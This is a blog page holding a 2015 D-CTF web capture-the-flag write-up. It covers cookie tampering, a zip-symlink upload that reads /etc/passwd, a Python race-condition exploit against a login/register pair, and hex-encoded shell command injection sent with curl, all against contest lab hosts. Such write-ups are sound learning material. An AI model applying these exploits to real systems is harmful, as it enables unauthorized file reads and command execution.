<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="utf-8" />
        <title>lili_blog - Xukaiyi</title>
        <link rel="stylesheet" href="/theme/css/main.css" />

        <!--[if IE]>
            <script src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="/">lili_blog </a></h1>
                <nav><ul>
                    <li><a href="/category/category.html">Category</a></li>
                    <li><a href="/category/ctf-web.html">CTF web</a></li>
                    <li><a href="/category/injection.html">InJection</a></li>
                    <li><a href="/category/web.html">web</a></li>
                </ul></nav>
        </header><!-- /#banner -->

            <aside id="featured" class="body">
                <article>
                    <h1 class="entry-title"><a href="/D-CTF web write up.html">D-CTF web write up</a></h1>
<footer class="post-info">
        <abbr class="published" title="2015-10-05T10:28:00+02:00">
                Published: 一 05 十月 2015
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/xukaiyi.html">Xukaiyi</a>
        </address>
<p>In <a href="/category/ctf-web.html">CTF web</a>.</p>
<p>tags: <a href="/tag/ctf.html">CTF</a> </p>
</footer><!-- /.post-info --><h2>WEB 100</h2>
<ol>
<li>
<p>This one is like a pay page and by sending ADD_NEW_MONEY, the apge shows I got $10, but when I repeatedly send ADD_NEW_MONEY, it shows i have already use "ADD_NEW_MONEY";</p>
</li>
<li>
<p>I guees there is some information it carry in the sended package that record if you have used ADD_NEW_MONEY, then I catch the package I send and all I saw is a phpsessid;</p>
</li>
<li>
<p>I try to modefy it randomly, if it become a new value, I can use ADD_NEW_MONEY again but once ,only $10 still. I try to clear it and then flag came~~</p>
<p><strong><em>flag DCTF{3a9bad36a0fb1edcaa83b6669d667061}</em></strong></p>
</li>
</ol>
<h2>WEB 200</h2>
<ol>
<li>
<p>WEB 200 is a upload-zip website ,in some way it may like that I made in 0CTF Final, that solution of issue is that you should upload a broken zip file and server will try to unzip the uploaded file. What's important thing is the server woludn't delete the file generated by broken zip file, and then A php eval can be uploaded.</p>
</li>
<li>
<p>In this exercise, things may by different.Firstly I try to upload a valid zip file, all it return are a log file, this file in myzip, and my original zip file. I can access those file by url like </p>
<div class="highlight"><pre><span></span>    http://10.13.37.3/?id=560f8ee139ae8&amp;file=./aaa/a.txt
</pre></div>


<p>id is random one and file is the relative path of filename. I try to LFI, but hacked action detected.</p>
</li>
<li>
<p>I also found a comment in HTML sources</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?</span> <span class="nv">$shell</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">&quot;getent passwd dctf | cut -d: -f7&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span>
</pre></div>


<p>Maybe it means that flag is in the /etc/passwd file</p>
</li>
<li>
<p>Firstly, I try to upload a broken zip file however it didn't work anyway, the output log just tell me the file I uploaded is a broken one.</p>
</li>
<li>
<p>Secondly, I try to upload a symbol link which is to /etc/passwd by the code like</p>
<div class="highlight"><pre><span></span>zip --symlink -r a.zip aaa/
</pre></div>


<p>I upload z.zip and the putput log says that the file I uploaded have some symbols and those symbols file isn't displayed in the output files. I try to download those file by </p>
<div class="highlight"><pre><span></span>    http://10.13.37.3/?id=560f8ee139ae8&amp;file=./aaa/a.txt
</pre></div>


<p>Fortunately, /etc/passwd is there and Flag is in the user DCTF's shell</p>
<p><strong><em>flag DCTF{28fad39245bc57404263540e94f417d8}</em></strong></p>
</li>
</ol>
<h2>WEB 300</h2>
<ol>
<li>
<p>In the first look, ther is a login.php and register.php. I try to register and login. All is normal and simple, I means the website^^.</p>
</li>
<li>
<p>Fisrtly, I fuzz the URL a litte, Luckily login.php~ and register.php~. </p>
<p><strong><em>login.php~</em></strong></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

    <span class="k">include_once</span><span class="p">(</span><span class="s1">&#39;config.php&#39;</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>

        <span class="nv">$q</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM `users` WHERE username=&quot;&#39;</span><span class="o">.</span><span class="nv">$user</span><span class="o">.</span><span class="s1">&#39;&quot; LIMIT 1&#39;</span><span class="p">;</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;nop&#39;</span><span class="p">);</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="cp">?&gt;</span> <span class="nt">&lt;h1&gt;</span>Logged in as <span class="cp">&lt;?php</span> <span class="k">echo</span><span class="p">(</span><span class="nv">$username</span><span class="p">);</span><span class="cp">?&gt;</span><span class="nt">&lt;/h1&gt;</span><span class="cp">&lt;?php</span>
        <span class="p">}</span>

        <span class="nv">$q</span> <span class="o">=</span> <span class="s1">&#39;SELECT * from `privs` WHERE uid=&quot;&#39;</span><span class="o">.</span><span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&quot;&#39;</span><span class="p">;</span>
        <span class="nv">$result2</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result2</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$result2</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result2</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$result2</span><span class="p">[</span><span class="s1">&#39;blocked&#39;</span><span class="p">])</span> <span class="p">{</span>
                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Your user was automatically blocked&#39;</span><span class="p">);</span>
            <span class="p">}</span> 
        <span class="p">}</span> 
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;CONGRATS! Flag: &#39;</span><span class="o">.</span> <span class="nx">FLAG</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="cp">?&gt;</span>
    <span class="nt">&lt;div&gt;</span>
        <span class="nt">&lt;h1&gt;</span>Login<span class="nt">&lt;/h1&gt;</span>
        <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;login.php&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;</span>
            <span class="nt">&lt;ul&gt;</span>
                <span class="nt">&lt;li&gt;</span>
                    <span class="nt">&lt;label&gt;</span>Username<span class="nt">&lt;/label&gt;</span>
                    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;username&quot;</span><span class="nt">&gt;</span>
                <span class="nt">&lt;/li&gt;</span>
                <span class="nt">&lt;li&gt;</span>
                    <span class="nt">&lt;label&gt;</span>Password<span class="nt">&lt;/label&gt;</span>
                    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span><span class="nt">&gt;</span>
                <span class="nt">&lt;/li&gt;</span>
                <span class="nt">&lt;li&gt;</span>
                    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Login&quot;</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
            <span class="nt">&lt;/ul&gt;</span>
        <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;/div&gt;</span>

    <span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span>
</pre></div>


<p><strong><em>register.php~</em></strong></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

    <span class="k">include_once</span><span class="p">(</span><span class="s1">&#39;config.php&#39;</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])){</span>
        <span class="nv">$username</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
        <span class="nv">$password</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>

        <span class="nv">$q</span> <span class="o">=</span> <span class="s2">&quot;INSERT into users (username, password) values (&#39;&quot;</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">&quot;&#39;, &#39;&quot;</span><span class="o">.</span><span class="nv">$password</span><span class="o">.</span><span class="s2">&quot;&#39;);&quot;</span><span class="p">;</span>

        <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
        <span class="nv">$q</span> <span class="o">=</span> <span class="s2">&quot;INSERT into privs (uid, blocked) values ((select users.id from users where username=&#39;&quot;</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">&quot;&#39;), TRUE);&quot;</span><span class="p">;</span>
        <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
        <span class="cp">?&gt;</span>
        <span class="nt">&lt;h2&gt;</span>Congrats! Login now!<span class="nt">&lt;/h2&gt;</span>
        <span class="cp">&lt;?php</span>
    <span class="p">}</span>  <span class="k">else</span> <span class="p">{</span>
        <span class="cp">?&gt;</span>
        <span class="nt">&lt;h1&gt;</span>Register<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;register.php&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;</span>
        <span class="nt">&lt;ul&gt;</span>
            <span class="nt">&lt;li&gt;</span>
                <span class="nt">&lt;label&gt;</span>Username<span class="nt">&lt;/label&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;username&quot;</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/li&gt;</span>
            <span class="nt">&lt;li&gt;</span>
                <span class="nt">&lt;label&gt;</span>Password<span class="nt">&lt;/label&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/li&gt;</span>
            <span class="nt">&lt;li&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span><span class="nt">&gt;</span>
                <span class="nt">&lt;/li&gt;</span>
        <span class="nt">&lt;/ul&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
        <span class="cp">&lt;?php</span>
    <span class="p">}</span>
</pre></div>


<ol>
<li>After a while audit code, no other problem found but a race condition problem: <strong>IF you register a user, and before insert into table privs, you login into.The boolean of privs table maybe default one maybe True.</strong></li>
</ol>
</li>
<li>
<p>Then with a thinking of coding, I can repeatedly try to login with an unregisered user in a thread and then register such a user, may work!</p>
</li>
<li>
<p>Here is EXP:</p>
<div class="highlight"><pre><span></span><span class="c1"># !/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="c1"># @author XuKai1@md4</span>
<span class="c1"># @version 2015/10/03</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">zlib</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">zipfile</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">thread</span>

<span class="c1">#DCTF{797b5361f70623db624656b3b6105f73}</span>
<span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;http://10.13.37.4/&quot;</span>

<span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;register.php&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span><span class="p">})</span>
    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>

<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;login.php&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">})</span>
    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>

<span class="k">def</span> <span class="nf">login2</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
    <span class="k">if</span> <span class="s2">&quot;Flag&quot;</span> <span class="ow">in</span> <span class="n">ret</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">ret</span>
    <span class="k">if</span> <span class="s2">&quot;blocked&quot;</span> <span class="ow">in</span> <span class="n">ret</span><span class="p">:</span>
        <span class="k">print</span> <span class="s2">&quot;sorry&quot;</span>

<span class="k">def</span> <span class="nf">startthread</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="n">thread</span><span class="o">.</span><span class="n">start_new_thread</span><span class="p">(</span><span class="n">login2</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="p">)</span> <span class="p">)</span>

<span class="k">def</span> <span class="nf">loop</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;nop&quot;</span><span class="p">:</span>
        <span class="k">return</span>
    <span class="n">startthread</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
    <span class="n">register</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">loop</span><span class="p">(</span><span class="s1">&#39;aaaasasdwczxcwdljasdaaqweqdalw&#39;</span><span class="p">)</span>
</pre></div>


<p><strong><em>DCTF{797b5361f70623db624656b3b6105f73}</em></strong></p>
</li>
</ol>
<h2>WEB 400</h2>
<ol>
<li>
<p>There are four pictures on the website, in the html source src can be found.</p>
<div class="highlight"><pre><span></span>http://10.13.37.5/?id=1&amp;usr=1
</pre></div>


</li>
<li>
<p>if id equals to usr, then normal picture can be displayed. But else some errors in the picture. With curl such result can be found.</p>
<div class="highlight"><pre><span></span>curl --url &quot;http://10.13.37.5/?id=1&amp;usr=2&quot;

cat: images/1_267.jpg: No such file or directory
</pre></div>


</li>
<li>
<p>After a fuzzing test, I found id is in [id]_XX.jpg and usr is related to [id]_[usr].jpg. if usr &gt; 5 or usr &lt; 0, maybe shell:</p>
<div class="highlight"><pre><span></span>cat images/
</pre></div>


<p>If else shell:</p>
<div class="highlight"><pre><span></span>cat images/(id)_(usr).jpg
</pre></div>


</li>
<li>
<p>I try to url like id=`ls` and usr=3, result is awlful: id and usr must be numberic.TAT</p>
</li>
<li>
<p>After a long time fuzzing, I found hex number can be very useful. HAHA</p>
</li>
<li>
<p>Then I am on the way: Firstly ls and then cat something</p>
<div class="highlight"><pre><span></span>curl --url &quot;http://10.13.37.5/?id=0x606c7360&amp;usr=2&quot;

cat: images/6e8218531e0580b6754b3e3be5252873.txt_267.jpg: No such file or directory
</pre></div>


<p>then cat 6e8218531e0580b6754b3e3be5252873.txt</p>
<div class="highlight"><pre><span></span>curl --url &#39;http://10.13.37.5/?id=0x606361742036653832313835333165303538306236373534623365336265353235323837332e74787460&amp;usr=2.000000000000000000000000000000&#39;
cat: images/DCTF{19b1f9f19688da85ec52a735c8da0dd3}_267.jpg: No such file or directory
</pre></div>


<p><strong><em>DCTF{19b1f9f19688da85ec52a735c8da0dd3}</em></strong></p>
</li>
</ol>                </article>
            </aside><!-- /#featured -->
                <section id="content" class="body">
                    <h1>Other articles</h1>
                    <hr />
                    <ol id="posts-list" class="hfeed">

            <li><article class="hentry">
                <header>
                    <h1><a href="/Injection In Charset.html" rel="bookmark"
                           title="Permalink to Injection In Charset">Injection In Charset</a></h1>
                </header>

                <div class="entry-content">
<footer class="post-info">
        <abbr class="published" title="2015-09-21T20:06:00+02:00">
                Published: 一 21 九月 2015
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/xukaiyi.html">Xukaiyi</a>
        </address>
<p>In <a href="/category/injection.html">InJection</a>.</p>
<p>tags: <a href="/tag/charset.html">Charset</a> <a href="/tag/sql-injection.html">SQL Injection</a> </p>
</footer><!-- /.post-info -->                <p>Analyze A SQL Injection In PHPwind</p>
                <a class="readmore" href="/Injection In Charset.html">read more</a>
                </div><!-- /.entry-content -->
            </article></li>
                </ol><!-- /#posts-list -->
                </section><!-- /#content -->
        <section id="extras" class="body">
                <div class="blogroll">
                        <h2>blogroll</h2>
                        <ul>
                            <li><a href="http://getpelican.com/">Pelican</a></li>
                            <li><a href="http://python.org/">Python.org</a></li>
                            <li><a href="http://jinja.pocoo.org/">Jinja2</a></li>
                            <li><a href="#">You can modify those links in your config file</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="social">
                        <h2>social</h2>
                        <ul>

                            <li><a href="#">You can add links in your config file</a></li>
                            <li><a href="#">Another social link</a></li>
                        </ul>
                </div><!-- /.social -->
        </section><!-- /#extras -->

        <footer id="contentinfo" class="body">
                <address id="about" class="vcard body">
                Proudly powered by <a href="http://getpelican.com/">Pelican</a>, which takes great advantage of <a href="http://python.org">Python</a>.
                </address><!-- /#about -->

                <p>The theme is by <a href="http://coding.smashingmagazine.com/2009/08/04/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
        </footer><!-- /#contentinfo -->

</body>
</html>